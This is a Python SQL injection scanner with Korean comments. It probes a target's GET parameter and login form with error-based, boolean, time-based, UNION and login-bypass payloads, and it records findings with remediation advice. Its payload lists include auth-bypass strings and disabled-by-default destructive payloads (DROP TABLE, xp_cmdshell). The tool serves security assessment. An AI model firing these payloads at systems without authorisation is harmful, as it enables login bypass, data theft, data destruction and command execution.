"""
sqli_scanner.py
================
SQL Injection 취약점 자동 진단 도구 (진단 로직 + JSON 결과 저장까지 단일 파일로 처리)

결과 스키마를 통일:
  vulnerability, status, risk, evidence, reason, recommendation,
  parameter, payload, confidence, tested_at

status      : "양호" | "취약" | "N/A"
risk        : "낮음" | "중간" | "높음"
confidence  : "확정"(직접 검증됨, 예: 에러 메시지 노출·로그인 실제 성공·SLEEP 지연 확인)
              "추정"(간접 근거로 추론, 예: 응답 길이 차이·UNION 응답 정상화만으로 판단)
              "판단불가"(N/A, 오류 등으로 판정 자체가 불가능했던 경우)
tested_at   : 진단 수행 시각 (ISO 8601)

진단 항목:
  1. scan_get_param        : Error-based + Boolean-based SQLi (검색창 등 GET 파라미터)
  2. scan_login_form       : 로그인 인증 우회 (OR/주석/큰따옴표 변형)
  3. scan_time_based       : Time-based Blind SQLi (SLEEP 지연 비교)
  4. scan_union_based      : UNION SELECT 기반 데이터 추출 가능성
  5. scan_destructive      : [기본 비활성/opt-in] DROP TABLE, xp_cmdshell 등 파괴적 페이로드

실행 방법:
    python3 sqli_scanner.py 

    # 파괴적 페이로드(DROP TABLE, xp_cmdshell)까지 포함하려면:
    python3 sqli_scanner.py --allow-destructive ...

"""

from __future__ import annotations

import argparse
import json
import time
from datetime import datetime
from typing import Optional
from urllib.parse import urlsplit, parse_qs

import requests

VALID_STATUSES = ("양호", "취약", "N/A")
VALID_RISKS = ("낮음", "중간", "높음")
VALID_CONFIDENCE = ("확정", "추정", "판단불가")


def make_result(vulnerability: str, status: str, risk: str, evidence: str,
                 reason: str, recommendation: str,
                 parameter: Optional[str] = None, payload: Optional[str] = None,
                 confidence: str = "확정") -> dict:
    assert status in VALID_STATUSES, f"잘못된 status: {status}"
    assert risk in VALID_RISKS, f"잘못된 risk: {risk}"
    assert confidence in VALID_CONFIDENCE, f"잘못된 confidence: {confidence}"
    return {
        "vulnerability": vulnerability,
        "status": status,
        "risk": risk,
        "evidence": evidence,
        "reason": reason,
        "recommendation": recommendation,
        "parameter": parameter,
        "payload": payload,
        "confidence": confidence,
        "tested_at": datetime.now().isoformat(),
    }


# --------------------------------------------------------------------------- #
# 페이로드 정의
# --------------------------------------------------------------------------- #

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "warning: mysql",
    "unclosed quotation mark",
    "sqlstate",
    "sqlite3.operationalerror",
    "pg_query()",
    "syntax error",
    "conversion failed when converting",  # CONVERT(int, ...) 에러 기반 (MSSQL)
    "unterminated string",
]

ERROR_PAYLOAD = "'"
BOOLEAN_TRUE_PAYLOADS = ["' OR '1'='1", "' OR 'a'='a"]
BOOLEAN_FALSE_PAYLOAD = "' AND '1'='2"

# "AND" 조건과 결합된 로그인 쿼리는 단순 OR만으로 우회되지 않으므로
# 뒤 조건을 주석 처리하는 변형까지 함께 시도한다.
# admin'-- : 비밀번호 검증 구문 자체를 주석 처리
# " OR ""=" : 입력값이 큰따옴표로 감싸지는 쿼리(일부 DB/설정)에 대응
LOGIN_BYPASS_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' #",
    "admin'-- ",
    '" OR ""="',
]

# Time-based Blind: DB마다 함수가 다르므로 대표적인 몇 가지를 순서대로 시도
TIME_BASED_PAYLOADS = [
    "' AND SLEEP(5)-- ",          # MySQL
    "'; WAITFOR DELAY '0:0:5'-- ",  # MSSQL
    "' AND pg_sleep(5)-- ",       # PostgreSQL
]
TIME_THRESHOLD_SEC = 4.5  # 이 이상 지연되면 지연 함수가 실제로 실행된 것으로 판단

# UNION-based: 컬럼 개수를 1~MAX까지 늘려가며 에러가 사라지는 지점을 탐색
UNION_MAX_COLUMNS = 8

# 파괴적 페이로드 (기본 비활성, --allow-destructive로만 실행)
DESTRUCTIVE_PAYLOADS = [
    ("1; DROP TABLE users-- ", "Stacked Query를 통한 테이블 삭제 시도"),
    ("'; EXEC xp_cmdshell('whoami')-- ", "MSSQL 확장 저장 프로시저를 통한 명령 실행 시도"),
]


def _contains_sql_error(text: str) -> Optional[str]:
    lowered = text.lower()
    for sig in SQL_ERROR_SIGNATURES:
        if sig in lowered:
            return sig
    return None


# --------------------------------------------------------------------------- #
# 1. Error-based + Boolean-based (GET 파라미터)
# --------------------------------------------------------------------------- #

def scan_get_param(session: requests.Session, url: str, param: str) -> dict:
    """검색창 등 GET 파라미터형 SQLi 점검 (Error-based -> Boolean-based 순서)"""
    try:
        baseline = session.get(url, params={param: "test"}, timeout=5)
        error_resp = session.get(url, params={param: ERROR_PAYLOAD}, timeout=5)
    except Exception as e:
        return make_result(
            vulnerability="SQL Injection",
            status="N/A", risk="중간",
            evidence=f"요청 실패: {e}",
            reason="대상에 정상적으로 접근할 수 없어 판정 불가",
            recommendation="네트워크/URL 확인 후 재점검 필요",
            parameter=param, payload=ERROR_PAYLOAD, confidence="판단불가",
        )

    sig = _contains_sql_error(error_resp.text)
    if sig:
        return make_result(
            vulnerability="SQL Injection (Error-based)",
            status="취약", risk="높음",
            evidence=f"페이로드 {ERROR_PAYLOAD!r} 입력 시 DB 에러 문구 노출: '{sig}' (status={error_resp.status_code})",
            reason="입력값이 SQL 쿼리에 그대로 삽입되어 DB 에러 메시지가 그대로 반환됨",
            recommendation="Prepared Statement(파라미터 바인딩) 사용, 에러 메시지는 사용자에게 상세 노출 금지",
            parameter=param, payload=ERROR_PAYLOAD, confidence="확정",
        )

    try:
        true_responses = [session.get(url, params={param: p}, timeout=5) for p in BOOLEAN_TRUE_PAYLOADS]
        false_resp = session.get(url, params={param: BOOLEAN_FALSE_PAYLOAD}, timeout=5)
    except Exception as e:
        return make_result(
            vulnerability="SQL Injection (Boolean-based)",
            status="N/A", risk="중간",
            evidence=f"요청 실패: {e}",
            reason="Boolean 기반 비교 요청 중 오류 발생",
            recommendation="네트워크/URL 확인 후 재점검 필요",
            parameter=param,
            payload=f"{'/'.join(BOOLEAN_TRUE_PAYLOADS)} / {BOOLEAN_FALSE_PAYLOAD}",
            confidence="판단불가",
        )

    baseline_len = len(baseline.text)
    for true_payload, true_resp in zip(BOOLEAN_TRUE_PAYLOADS, true_responses):
        len_diff = abs(len(true_resp.text) - len(false_resp.text))
        if len_diff > 20 and len_diff > baseline_len * 0.02:
            return make_result(
                vulnerability="SQL Injection (Boolean-based)",
                status="취약", risk="높음",
                evidence=f"참 조건({true_payload!r}) 응답 길이={len(true_resp.text)}, 거짓 조건 응답 길이={len(false_resp.text)} (차이 {len_diff}byte)",
                reason="참/거짓 SQL 조건에 따라 응답 내용이 다르게 반환되어 쿼리 조작 가능성 확인",
                recommendation="Prepared Statement 사용, 입력값 화이트리스트 검증 적용",
                parameter=param,
                payload=f"{true_payload} / {BOOLEAN_FALSE_PAYLOAD}",
                confidence="추정",  # 응답 길이 차이라는 간접 신호에 근거
            )

    return make_result(
        vulnerability="SQL Injection",
        status="양호", risk="낮음",
        evidence="에러 메시지 미노출, 참/거짓 조건 응답 차이 없음",
        reason="Error-based, Boolean-based 탐지 페이로드에 유의미한 반응 없음",
        recommendation="현재 상태 유지, 정기적인 재점검 권장",
        parameter=param,
        payload=f"{ERROR_PAYLOAD} / {'/'.join(BOOLEAN_TRUE_PAYLOADS)}",
        confidence="추정",  # 현재 페이로드 목록 범위 내에서만 확인됨
    )


# --------------------------------------------------------------------------- #
# 2. 로그인 인증 우회
# --------------------------------------------------------------------------- #

def scan_login_form(session: requests.Session, url: str, id_param: str, pw_param: str,
                     success_indicator: str) -> dict:
    """로그인 폼 인증 우회형 SQLi 점검"""
    for payload in LOGIN_BYPASS_PAYLOADS:
        try:
            resp = session.post(
                url, data={id_param: payload, pw_param: "anything"},
                timeout=5, allow_redirects=True,
            )
        except Exception as e:
            return make_result(
                vulnerability="SQL Injection - 로그인 인증 우회",
                status="N/A", risk="높음",
                evidence=f"요청 실패: {e}",
                reason="로그인 요청을 정상적으로 보낼 수 없어 판정 불가",
                recommendation="로그인 엔드포인트/파라미터명 확인 후 재점검 필요",
                parameter=id_param, payload=payload, confidence="판단불가",
            )

        bypassed = (
            success_indicator.lower() in resp.text.lower()
            or success_indicator.lower() in resp.url.lower()
        )
        if bypassed:
            return make_result(
                vulnerability="SQL Injection - 로그인 인증 우회",
                status="취약", risk="높음",
                evidence=f"페이로드 {payload!r} 입력 시 비밀번호 검증 없이 로그인 성공 (최종 URL: {resp.url})",
                reason="로그인 쿼리에 입력값이 그대로 삽입되어 WHERE 조건이 항상 참이 되도록 조작 가능함",
                recommendation="Prepared Statement 적용, 비밀번호는 해시 비교 방식으로 별도 검증",
                parameter=id_param, payload=payload, confidence="확정",  # 실제 로그인 성공까지 직접 확인
            )

    return make_result(
        vulnerability="SQL Injection - 로그인 인증 우회",
        status="양호", risk="낮음",
        evidence="인증 우회 페이로드 입력 시 로그인 실패 처리됨",
        reason="로그인 폼이 SQLi 인증 우회 페이로드에 반응하지 않음",
        recommendation="현재 상태 유지, 정기적인 재점검 권장",
        parameter=id_param, payload=", ".join(LOGIN_BYPASS_PAYLOADS),
        confidence="추정",  # 현재 페이로드 목록 범위 내에서만 확인됨
    )


# --------------------------------------------------------------------------- #
# 3. Time-based Blind SQLi
# --------------------------------------------------------------------------- #

def scan_time_based(session: requests.Session, url: str, param: str) -> dict:
    """
    응답에 아무 차이가 없어도(에러 미노출, Boolean 차이 없음) 쿼리 실행 자체는
    조작 가능한 경우를 잡아내기 위한 시간 지연 기반 탐지.
    DB 종류를 모르는 블랙박스 상황이라 MySQL/MSSQL/PostgreSQL용 페이로드를 순서대로 시도.
    """
    try:
        baseline_start = time.monotonic()
        session.get(url, params={param: "test"}, timeout=10)
        baseline_elapsed = time.monotonic() - baseline_start
    except Exception as e:
        return make_result(
            vulnerability="SQL Injection (Time-based Blind)",
            status="N/A", risk="중간",
            evidence=f"기준 응답 시간 측정 실패: {e}",
            reason="대상에 정상적으로 접근할 수 없어 판정 불가",
            recommendation="네트워크/URL 확인 후 재점검 필요",
            parameter=param, payload=None, confidence="판단불가",
        )

    for payload in TIME_BASED_PAYLOADS:
        try:
            start = time.monotonic()
            session.get(url, params={param: payload}, timeout=10)
            elapsed = time.monotonic() - start
        except requests.exceptions.Timeout:
            # 타임아웃 자체가 지연 함수가 실행됐다는 강한 정황일 수 있음
            return make_result(
                vulnerability="SQL Injection (Time-based Blind)",
                status="취약", risk="높음",
                evidence=f"페이로드 {payload!r} 입력 시 요청이 타임아웃(10초 초과)됨",
                reason="지연 함수(SLEEP/WAITFOR/pg_sleep)가 실제로 실행되어 응답이 비정상적으로 지연됨",
                recommendation="Prepared Statement 사용, 입력값 화이트리스트 검증 적용",
                parameter=param, payload=payload, confidence="확정",
            )
        except Exception:
            continue

        if elapsed - baseline_elapsed >= TIME_THRESHOLD_SEC:
            return make_result(
                vulnerability="SQL Injection (Time-based Blind)",
                status="취약", risk="높음",
                evidence=f"페이로드 {payload!r} 입력 시 응답 시간 {elapsed:.2f}초 (기준 {baseline_elapsed:.2f}초 대비 {elapsed - baseline_elapsed:.2f}초 지연)",
                reason="지연 함수가 실제로 실행되어 쿼리 실행 흐름을 조작 가능함을 확인",
                recommendation="Prepared Statement 사용, 입력값 화이트리스트 검증 적용",
                parameter=param, payload=payload, confidence="확정",  # 응답 시간을 직접 측정해 확인
            )

    return make_result(
        vulnerability="SQL Injection (Time-based Blind)",
        status="양호", risk="낮음",
        evidence=f"기준 응답 시간 {baseline_elapsed:.2f}초, 지연 페이로드 응답 시간 모두 유의미한 차이 없음",
        reason="시도한 지연 함수 페이로드(SLEEP/WAITFOR/pg_sleep)에 유의미한 반응 없음",
        recommendation="현재 상태 유지, 정기적인 재점검 권장",
        parameter=param, payload="/".join(TIME_BASED_PAYLOADS), confidence="추정",
    )


# --------------------------------------------------------------------------- #
# 4. UNION-based SQLi
# --------------------------------------------------------------------------- #

def scan_union_based(session: requests.Session, url: str, param: str,
                      max_columns: int = UNION_MAX_COLUMNS) -> dict:
    """
    컬럼 개수를 1개씩 늘려가며 UNION SELECT NULL,NULL,... 을 시도해, 에러 없이
    응답이 정상화되는(=컬럼 개수가 맞아떨어지는) 지점이 있는지 확인한다.
    실제 데이터가 화면에 노출되는지까지는 확인하지 않으므로 confidence는 "추정".
    """
    try:
        baseline = session.get(url, params={param: "test"}, timeout=5)
        error_resp = session.get(url, params={param: ERROR_PAYLOAD}, timeout=5)
    except Exception as e:
        return make_result(
            vulnerability="SQL Injection (UNION-based)",
            status="N/A", risk="중간",
            evidence=f"요청 실패: {e}",
            reason="대상에 정상적으로 접근할 수 없어 판정 불가",
            recommendation="네트워크/URL 확인 후 재점검 필요",
            parameter=param, payload=None, confidence="판단불가",
        )

    baseline_had_error = _contains_sql_error(error_resp.text) is not None

    for n in range(1, max_columns + 1):
        payload = f"' UNION SELECT {','.join(['NULL'] * n)}-- "
        try:
            resp = session.get(url, params={param: payload}, timeout=5)
        except Exception:
            continue

        has_error = _contains_sql_error(resp.text) is not None
        # 원래(단일 따옴표만 넣었을 때) 에러가 나던 상황이었는데, 특정 컬럼 개수의
        # UNION SELECT에서는 에러 없이 baseline과 비슷한 정상 응답이 오면 컬럼 개수가
        # 맞아떨어진 것으로 추정
        if baseline_had_error and not has_error and resp.status_code == baseline.status_code:
            return make_result(
                vulnerability="SQL Injection (UNION-based)",
                status="취약", risk="높음",
                evidence=f"컬럼 {n}개로 맞춘 UNION SELECT 페이로드 응답 시 에러 없이 정상 응답(status={resp.status_code})으로 전환됨",
                reason="UNION SELECT의 컬럼 개수가 원본 쿼리와 일치하는 지점에서 에러가 사라져, 다른 테이블의 데이터를 함께 조회(UNION)할 수 있는 구조로 추정됨",
                recommendation="Prepared Statement 사용, UNION 등 쿼리 구조 조작이 불가능하도록 입력값을 파라미터 바인딩 처리",
                parameter=param, payload=payload, confidence="추정",  # 실제 데이터 노출까지는 미확인
            )

    return make_result(
        vulnerability="SQL Injection (UNION-based)",
        status="양호", risk="낮음",
        evidence=f"컬럼 1~{max_columns}개 범위의 UNION SELECT 시도 중 정상 응답으로 전환되는 지점 없음",
        reason=f"UNION SELECT 페이로드(컬럼 1~{max_columns}개)에 유의미한 반응 없음",
        recommendation="현재 상태 유지, 정기적인 재점검 권장 (컬럼 수가 더 많은 테이블이라면 재확인 필요)",
        parameter=param, payload=f"UNION SELECT NULL (x1~{max_columns})", confidence="추정",
    )


# --------------------------------------------------------------------------- #
# 5. 파괴적 페이로드 (기본 비활성, opt-in)
# --------------------------------------------------------------------------- #

def scan_destructive(session: requests.Session, url: str, param: str) -> list:
    """
    ⚠️ 실제로 테이블을 삭제하거나(DROP TABLE) 서버 명령을 실행(xp_cmdshell)시킬 수
    있는 페이로드. main()에서 --allow-destructive 플래그가 명시적으로 주어졌을
    때만 호출된다. 응답만으로는 실제 실행 여부를 확정할 수 없으므로 status는
    "취약"으로 자동 판정하지 않고, 에러 유무만 기록해 사람이 직접 DB 상태를
    확인하도록 한다 (confidence="추정" 고정).
    """
    results = []
    for payload, desc in DESTRUCTIVE_PAYLOADS:
        try:
            resp = session.get(url, params={param: payload}, timeout=10)
            error_found = _contains_sql_error(resp.text)
            results.append(make_result(
                vulnerability=f"SQL Injection (파괴적 페이로드 - {desc})",
                status="N/A", risk="높음",
                evidence=(
                    f"페이로드 전송 완료(status={resp.status_code}, "
                    f"에러 문구 {'노출됨: ' + error_found if error_found else '미노출'}). "
                    "응답만으로는 실제 테이블 삭제/명령 실행 여부를 확정할 수 없음"
                ),
                reason="스택 쿼리(stacked query) 실행 가능 여부는 응답 코드/에러 유무만으로 확정할 수 없어, DB를 직접 확인해야 함",
                recommendation="스택 쿼리 실행이 가능한 DB 드라이버/설정 여부 점검, Prepared Statement 및 최소 권한 DB 계정 사용",
                parameter=param, payload=payload, confidence="추정",
            ))
        except Exception as e:
            results.append(make_result(
                vulnerability=f"SQL Injection (파괴적 페이로드 - {desc})",
                status="N/A", risk="높음",
                evidence=f"요청 실패: {e}",
                reason="대상에 정상적으로 접근할 수 없어 판정 불가",
                recommendation="네트워크/URL 확인 후 재점검 필요",
                parameter=param, payload=payload, confidence="판단불가",
            ))
    return results


# --------------------------------------------------------------------------- #
# 실행 취합
# --------------------------------------------------------------------------- #

def run_all(base_url: str, search_path: str, search_param: str,
            login_path: str, id_param: str, pw_param: str,
            success_indicator: str, allow_destructive: bool = False) -> list:
    results = []

    s1 = requests.Session()
    results.append(scan_get_param(s1, base_url.rstrip("/") + search_path, search_param))

    s2 = requests.Session()
    results.append(scan_login_form(s2, base_url.rstrip("/") + login_path, id_param, pw_param, success_indicator))

    s3 = requests.Session()
    results.append(scan_time_based(s3, base_url.rstrip("/") + search_path, search_param))

    s4 = requests.Session()
    results.append(scan_union_based(s4, base_url.rstrip("/") + search_path, search_param))

    # 팀 전체 안전을 위해 파괴적 테스트 자체를 비활성화 (필요 시 아래 3줄 주석 해제)
    # if allow_destructive:
    #     s5 = requests.Session()
    #     results.extend(scan_destructive(s5, base_url.rstrip("/") + search_path, search_param))

    return results


# --------------------------------------------------------------------------- #
# CLI 진입점
# --------------------------------------------------------------------------- #

def main():
    parser = argparse.ArgumentParser(description="SQL Injection 취약점 자동 진단 도구")
    parser.add_argument("--url", default=None,
                         help="[간편 모드] 검색 결과 등 파라미터가 붙은 URL을 통째로 붙여넣으면 "
                              "base-url/search-path/search-param을 자동으로 뽑아냄. "
                              "예: --url \"http://localhost:8081/board.php?keyword=test\" "
                              "(로그인 인증 우회 검사는 이 옵션만으로는 불가능 — 별도로 --login-path 등 필요)")
    parser.add_argument("--base-url", default=None,
                         help="진단 대상 base URL. --url을 안 쓸 경우 필수. 예: http://localhost:8081")
    parser.add_argument("--search-path", default="/inquiry/list.php")
    parser.add_argument("--search-param", default="keyword")
    parser.add_argument("--login-path", default="/auth/login.php")
    parser.add_argument("--id-param", default="id")
    parser.add_argument("--pw-param", default="pw")
    parser.add_argument("--success-indicator", default="환영합니다",
                         help="로그인 성공 시 응답/URL에 포함되는 문자열")
    parser.add_argument("--allow-destructive", action="store_true",
                         help="[주의] DROP TABLE, xp_cmdshell 등 파괴적 페이로드까지 실행. "
                              "반드시 진단 권한이 있는 자체 구축 테스트 환경에서만 사용할 것")
    parser.add_argument("--output", default="sqli_scan_result.json")
    args = parser.parse_args()

    if args.url:
        parsed = urlsplit(args.url)
        args.base_url = f"{parsed.scheme}://{parsed.netloc}"
        args.search_path = parsed.path
        query_params = parse_qs(parsed.query)
        if query_params:
            args.search_param = next(iter(query_params))
        else:
            print("⚠️  --url에 '?파라미터=값' 형태가 없어서 search-param을 자동으로 알아낼 수 없습니다.")
            print("    --search-param을 직접 지정해주세요.")
        print(f"🔎 --url 자동 분석: base-url={args.base_url}, search-path={args.search_path}, search-param={args.search_param}")
        print("   (로그인 인증 우회 검사는 이 정보만으론 불가능하니, 필요하면 --login-path/--id-param/--pw-param을 추가로 지정하세요)")
    elif not args.base_url:
        # 예전에는 여기서 아무것도 지정 안 하면 조용히 http://localhost:8081로 진단이
        # 나갔다. 대시보드/다른 스크립트에서 base_url을 깜빡 빠뜨리고 호출해도 티가
        # 안 나는 문제가 있어, 이제는 반드시 --url 또는 --base-url 중 하나를 명시하도록 강제한다.
        parser.error("--base-url 또는 --url 중 하나는 반드시 지정해야 합니다. (예: --base-url http://localhost:8081)")

    print(f"🎯 진단 대상: {args.base_url}")

    if args.allow_destructive:
        print("⚠️  --allow-destructive 옵션을 주셨지만, 코드에서 파괴적 테스트 실행부를 비활성화해뒀습니다.")
        print("    실행하려면 run_all() 안의 주석 처리된 부분을 다시 활성화하세요.")


    results = run_all(
        base_url=args.base_url,
        search_path=args.search_path,
        search_param=args.search_param,
        login_path=args.login_path,
        id_param=args.id_param,
        pw_param=args.pw_param,
        success_indicator=args.success_indicator,
        allow_destructive=args.allow_destructive,
    )

    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)

    print(f"총 {len(results)}개 항목 진단 완료 -> {args.output} 저장")
    for r in results:
        print(f"- [{r['status']}/{r['risk']}/{r['confidence']}] {r['vulnerability']}")


if __name__ == "__main__":
    main()
